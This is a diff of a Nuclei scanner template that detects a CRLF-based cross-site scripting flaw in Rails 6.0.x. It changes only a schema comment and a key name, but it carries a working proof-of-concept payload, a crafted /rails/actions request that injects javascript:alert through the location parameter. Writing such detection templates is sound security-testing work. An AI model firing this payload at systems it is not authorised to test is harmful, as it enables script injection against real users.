@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: rails6-xss
 info:
   name: Rails CRLF XSS (6.0.0 < rails < 6.0.3.2)
@@ -10,7 +11,7 @@ info:
   #  extended payload to make Nuclei work.
   #  Working poc by @Mad-robot
   # /rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0Djavascript%3Aalert%28document.domain%29
-requests:
+http:
   - method: POST
     path:
       - "{{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa"
